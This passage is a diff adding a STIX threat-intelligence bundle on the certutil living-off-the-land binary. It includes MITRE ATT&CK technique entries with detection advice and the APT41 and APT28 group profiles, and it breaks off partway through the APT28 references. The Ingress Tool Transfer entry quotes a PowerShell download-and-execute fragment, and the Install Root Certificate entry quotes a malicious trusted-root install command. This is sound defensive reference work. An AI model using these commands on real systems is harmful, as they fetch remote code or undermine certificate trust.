@@ -1,0 +1,1872 @@
+{
+  "spec_version": "2.1",
+  "id": "bundle--3bd2b04f-8819-4ccd-b763-7bd0a3acd09c",
+  "type": "bundle",
+  "objects": [
+    {
+      "name": "Nounou Mbeiri",
+      "identity_class": "individual",
+      "contact_information": "Twitter: @Nounou_Mbeiri",
+      "description": "MITRE ATT&CK Defender (MAD) | Cyber Threat Intelligence researcher | Collaborator in Cyber Threat Intelligence community (GINSEG) | Public Speaking",
+      "type": "identity",
+      "spec_version": "2.1",
+      "id": "identity--1dd7bca6-cef5-4395-826f-64994241b3cf",
+      "created": "2021-03-10T10:00:00.000Z",
+      "modified": "2021-03-10T10:00:00.000Z"
+    },
+    {
+      "name": "LOLBin: Certutil",
+      "description": "Certutil is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. ",
+      "type": "report",
+      "spec_version": "2.1",
+      "id": "report--daaf4899-83a9-4781-a656-23629da2a7df",
+      "created_by_ref": "identity--1dd7bca6-cef5-4395-826f-64994241b3cf",
+      "created": "2023-08-25T19:59:11.000Z",
+      "modified": "2023-08-25T19:59:11.000Z",
+      "published": "2023-08-25T19:59:11.000Z",
+      "report_types": [
+        "tool"
+      ],
+      "object_refs": [
+        "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc"
+      ]
+    },
+    {
+      "modified": "2023-03-03T00:40:22.280Z",
+      "name": "certutil",
+      "description": "[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "1.3",
+      "x_mitre_aliases": [
+        "certutil",
+        "certutil.exe"
+      ],
+      "type": "tool",
+      "id": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+      "created": "2017-12-14T16:46:06.044Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0160",
+          "external_id": "S0160"
+        },
+        {
+          "source_name": "TechNet Certutil",
+          "description": "Microsoft. (2012, November 14). Certutil. Retrieved July 3, 2017.",
+          "url": "https://technet.microsoft.com/library/cc732443.aspx"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "tool"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-04-14T19:28:21.394Z",
+      "name": "Archive via Utility",
+      "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "collection"
+        }
+      ],
+      "x_mitre_contributors": [
+        "Mayan Arora aka Mayan Mohan",
+        "Mark Wee"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_detection": "Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_platforms": [
+        "Linux",
+        "macOS",
+        "Windows"
+      ],
+      "x_mitre_version": "1.2",
+      "x_mitre_data_sources": [
+        "File: File Creation",
+        "Process: Process Creation",
+        "Command: Command Execution"
+      ],
+      "type": "attack-pattern",
+      "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
+      "created": "2020-02-20T21:01:25.428Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1560/001",
+          "external_id": "T1560.001"
+        },
+        {
+          "source_name": "WinRAR Homepage",
+          "description": "A. Roshal. (2020). RARLAB. Retrieved February 20, 2020.",
+          "url": "https://www.rarlab.com/"
+        },
+        {
+          "source_name": "WinZip Homepage",
+          "description": "Corel Corporation. (2020). WinZip. Retrieved February 20, 2020.",
+          "url": "https://www.winzip.com/win/en/"
+        },
+        {
+          "source_name": "7zip Homepage",
+          "description": "I. Pavlov. (2019). 7-Zip. Retrieved February 20, 2020.",
+          "url": "https://www.7-zip.org/"
+        },
+        {
+          "source_name": "diantz.exe_lolbas",
+          "description": "Living Off The Land Binaries, Scripts and Libraries (LOLBAS). (n.d.). Diantz.exe. Retrieved October 25, 2021.",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Diantz/"
+        },
+        {
+          "source_name": "Wikipedia File Header Signatures",
+          "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
+          "url": "https://en.wikipedia.org/wiki/List_of_file_signatures"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-04-14T19:27:57.370Z",
+      "name": "Ingress Tool Transfer",
+      "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "command-and-control"
+        }
+      ],
+      "x_mitre_contributors": [
+        "John Page (aka hyp3rlinx), ApparitionSec",
+        "Mark Wee"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_platforms": [
+        "Linux",
+        "macOS",
+        "Windows"
+      ],
+      "x_mitre_version": "2.2",
+      "x_mitre_data_sources": [
+        "Network Traffic: Network Traffic Flow",
+        "Network Traffic: Network Connection Creation",
+        "Network Traffic: Network Traffic Content",
+        "File: File Creation"
+      ],
+      "type": "attack-pattern",
+      "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+      "created": "2017-05-31T21:31:16.408Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1105",
+          "external_id": "T1105"
+        },
+        {
+          "source_name": "University of Birmingham C2",
+          "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+          "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+        },
+        {
+          "source_name": "t1105_lolbas",
+          "description": "LOLBAS. (n.d.). LOLBAS Mapped to T1105. Retrieved March 11, 2022.",
+          "url": "https://lolbas-project.github.io/#t1105"
+        },
+        {
+          "source_name": "PTSecurity Cobalt Dec 2016",
+          "description": "Positive Technologies. (2016, December 16). Cobalt Snatch. Retrieved October 9, 2018.",
+          "url": "https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-04-21T12:21:06.026Z",
+      "name": "Deobfuscate/Decode Files or Information",
+      "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "defense-evasion"
+        }
+      ],
+      "x_mitre_contributors": [
+        "Matthew Demaske, Adaptforward",
+        "Red Canary"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_detection": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_platforms": [
+        "Windows",
+        "Linux",
+        "macOS"
+      ],
+      "x_mitre_version": "1.2",
+      "x_mitre_data_sources": [
+        "Script: Script Execution",
+        "Process: Process Creation",
+        "File: File Modification"
+      ],
+      "x_mitre_defense_bypassed": [
+        "Anti-virus",
+        "Host Intrusion Prevention Systems",
+        "Signature-based Detection",
+        "Network Intrusion Detection System"
+      ],
+      "type": "attack-pattern",
+      "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
+      "created": "2017-12-14T16:46:06.044Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1140",
+          "external_id": "T1140"
+        },
+        {
+          "source_name": "Volexity PowerDuke November 2016",
+          "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
+          "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+        },
+        {
+          "source_name": "Malwarebytes Targeted Attack against Saudi Arabia",
+          "description": "Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",
+          "url": "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/"
+        },
+        {
+          "source_name": "Carbon Black Obfuscation Sept 2016",
+          "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
+          "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-30T21:01:45.661Z",
+      "name": "Install Root Certificate",
+      "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "defense-evasion"
+        }
+      ],
+      "x_mitre_contributors": [
+        "Matt Graeber, @mattifestation, SpecterOps",
+        "Red Canary",
+        "Travis Smith, Tripwire",
+        "Itzik Kotler, SafeBreach"
+      ],
+      "x_mitre_detection": "A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_platforms": [
+        "Linux",
+        "macOS",
+        "Windows"
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_data_sources": [
+        "Process: Process Creation",
+        "Command: Command Execution",
+        "Windows Registry: Windows Registry Key Creation",
+        "Windows Registry: Windows Registry Key Modification"
+      ],
+      "x_mitre_defense_bypassed": [
+        "Digital Certificate Validation"
+      ],
+      "x_mitre_permissions_required": [
+        "Administrator",
+        "User"
+      ],
+      "type": "attack-pattern",
+      "id": "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839",
+      "created": "2020-02-21T21:05:32.844Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1553/004",
+          "external_id": "T1553.004"
+        },
+        {
+          "source_name": "Wikipedia Root Certificate",
+          "description": "Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.",
+          "url": "https://en.wikipedia.org/wiki/Root_certificate"
+        },
+        {
+          "source_name": "Operation Emmental",
+          "description": "Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.",
+          "url": "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf"
+        },
+        {
+          "source_name": "Kaspersky Superfish",
+          "description": "Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.",
+          "url": "https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/"
+        },
+        {
+          "source_name": "SpectorOps Code Signing Dec 2017",
+          "description": "Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.",
+          "url": "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec"
+        },
+        {
+          "source_name": "objective-see ay mami 2018",
+          "description": "Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.",
+          "url": "https://objective-see.com/blog/blog_0x26.html"
+        },
+        {
+          "source_name": "Microsoft Sigcheck May 2017",
+          "description": "Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.",
+          "url": "https://docs.microsoft.com/sysinternals/downloads/sigcheck"
+        },
+        {
+          "source_name": "Tripwire AppUNBlocker",
+          "description": "Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.",
+          "url": "https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0"
+    },
+    {
+      "modified": "2023-03-23T15:45:58.846Z",
+      "name": "APT41",
+      "description": "[APT41](https://attack.mitre.org/groups/G0096) is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, [APT41](https://attack.mitre.org/groups/G0096) has been observed targeting healthcare, telecom, technology, and video game industries in 14 countries. [APT41](https://attack.mitre.org/groups/G0096) overlaps at least partially with public reporting on groups including BARIUM and [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\n",
+      "aliases": [
+        "APT41",
+        "Wicked Panda"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "3.1",
+      "x_mitre_contributors": [
+        "Kyaw Pyiyt Htet, @KyawPyiytHtet"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--18854f55-ac7c-4634-bd9a-352dd07613b7",
+      "created": "2019-09-23T13:43:36.945Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0096",
+          "external_id": "G0096"
+        },
+        {
+          "source_name": "Wicked Panda",
+          "description": "(Citation: Crowdstrike GTR2020 Mar 2020)"
+        },
+        {
+          "source_name": "APT41",
+          "description": "(Citation: FireEye APT41 2019)"
+        },
+        {
+          "source_name": "Crowdstrike GTR2020 Mar 2020",
+          "description": "Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020.",
+          "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+        },
+        {
+          "source_name": "FireEye APT41 2019",
+          "description": "FireEye. (2019). Double DragonAPT41, a dual espionage andcyber crime operationAPT41. Retrieved September 23, 2019.",
+          "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+        },
+        {
+          "source_name": "FireEye APT41 Aug 2019",
+          "description": "Fraser, N., et al. (2019, August 7). Double DragonAPT41, a dual espionage and cyber crime operation APT41. Retrieved September 23, 2019.",
+          "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+        },
+        {
+          "source_name": "Group IB APT 41 June 2021",
+          "description": "Rostovcev, N. (2021, June 10). Big airline heist APT41 likely behind a third-party attack on Air India. Retrieved August 26, 2021.",
+          "url": "https://www.group-ib.com/blog/colunmtk-apt41/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-26T17:51:20.401Z",
+      "name": "APT28",
+      "description": "[APT28](https://attack.mitre.org/groups/G0007) is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) This group has been active since at least 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy May 2019)\n\n[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election. (Citation: Crowdstrike DNC June 2016) In 2018, the US indicted five GRU Unit 26165 officers associated with [APT28](https://attack.mitre.org/groups/G0007) for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.(Citation: US District Court Indictment GRU Oct 2018) Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as [Sandworm Team](https://attack.mitre.org/groups/G0034). ",
+      "aliases": [
+        "APT28",
+        "IRON TWILIGHT",
+        "SNAKEMACKEREL",
+        "Swallowtail",
+        "Group 74",
+        "Sednit",
+        "Sofacy",
+        "Pawn Storm",
+        "Fancy Bear",
+        "STRONTIUM",
+        "Tsar Team",
+        "Threat Group-4127",
+        "TG-4127"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "4.0",
+      "x_mitre_contributors": [
+        "Sébastien Ruel, CGI",
+        "Drew Church, Splunk",
+        "Emily Ratliff, IBM",
+        "Richard Gold, Digital Shadows"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--bef4c620-0787-42a8-a96d-b7eb6e85917c",
+      "created": "2017-05-31T21:31:48.664Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0007",
+          "external_id": "G0007"
+        },
+        {
+          "source_name": "SNAKEMACKEREL",
+          "description": "(Citation: Accenture SNAKEMACKEREL Nov 2018)"
+        },
+        {
+          "source_name": "Fancy Bear",
+          "description": "(Citation: Crowdstrike DNC June 2016)(Citation: Kaspersky Sofacy)(Citation: ESET Sednit Part 3)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Talos Seduploader Oct 2017)(Citation: Symantec APT28 Oct 2018)(Citation: Securelist Sofacy Feb 2018)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021)"
+        },
+        {
+          "source_name": "Tsar Team",
+          "description": "(Citation: ESET Sednit Part 3)(Citation: Talos Seduploader Oct 2017)(Citation: Talos Seduploader Oct 2017)"
+        },
+        {
+          "source_name": "APT28",
+          "description": "(Citation: FireEye APT28) (Citation: SecureWorks TG-4127) (Citation: Crowdstrike DNC June 2016) (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 3) (Citation: Ars Technica GRU indictment Jul 2018)(Citation: Talos Seduploader Oct 2017)(Citation: Symantec APT28 Oct 2018)(Citation: Securelist Sofacy Feb 2018)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021)"
+        },
+        {
+          "source_name": "STRONTIUM",
+          "description": "(Citation: Kaspersky Sofacy)(Citation: ESET Sednit Part 3)(Citation: Microsoft STRONTIUM Aug 2019)(Citation: Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020)(Citation: TrendMicro Pawn Storm Dec 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021)"
+        },
+        {
+          "source_name": "IRON TWILIGHT",
+          "description": "(Citation: Secureworks IRON TWILIGHT Profile)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017)"
+        },
+        {
+          "source_name": "Threat Group-4127",
+          "description": "(Citation: SecureWorks TG-4127)"
+        },
+        {
+          "source_name": "TG-4127",
+          "description": "(Citation: SecureWorks TG-4127)"
+        },
+        {
+          "source_name": "Pawn Storm",
+          "description": "(Citation: SecureWorks TG-4127)(Citation: ESET Sednit Part 3)(Citation: TrendMicro Pawn Storm Dec 2020) "
+        },
+        {
+          "source_name": "Swallowtail",
+          "description": "(Citation: Symantec APT28 Oct 2018)"
+        },
+        {
+          "source_name": "Group 74",
+          "description": "(Citation: Talos Seduploader Oct 2017)"
+        },
+        {
+          "source_name": "Accenture SNAKEMACKEREL Nov 2018",
+          "description": "Accenture Security. (2018, November 29). SNAKEMACKEREL. Retrieved April 15, 2019.",
+          "url": "https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50"
+        },
+        {
+          "source_name": "Crowdstrike DNC June 2016",
+          "description": "Alperovitch, D.. (2016, June 15). Bears in the Midst: Intrusion into the Democratic National Committee. Retrieved August 3, 2016.",
+          "url": "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+        },
+        {
+          "source_name": "US District Court Indictment GRU Oct 2018",
+          "description": "Brady, S . (2018, October 3). Indictment - United States vs Aleksei Sergeyevich Morenets, et al.. Retrieved October 1, 2020.",
+          "url": "https://www.justice.gov/opa/page/file/1098481/download"
+        },
+        {
+          "source_name": "GRIZZLY STEPPE JAR",
+          "description": "Department of Homeland Security and Federal Bureau of Investigation. (2016, December 29). GRIZZLY STEPPE – Russian Malicious Cyber Activity. Retrieved January 11, 2017.",
+          "url": "https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296A_GRIZZLY%20STEPPE-2016-1229.pdf"
+        },
+        {
+          "source_name": "ESET Zebrocy May 2019",
+          "description": "ESET Research. (2019, May 22). A journey to Zebrocy land. Retrieved June 20, 2019.",
+          "url": "https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"
+        },
+        {
+          "source_name": "ESET Sednit Part 3",
+          "description": "ESET. (2016, October). En Route with Sednit - Part 3: A Mysterious Downloader. Retrieved November 21, 2016.",
+          "url": "http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part3.pdf"
+        },
+        {
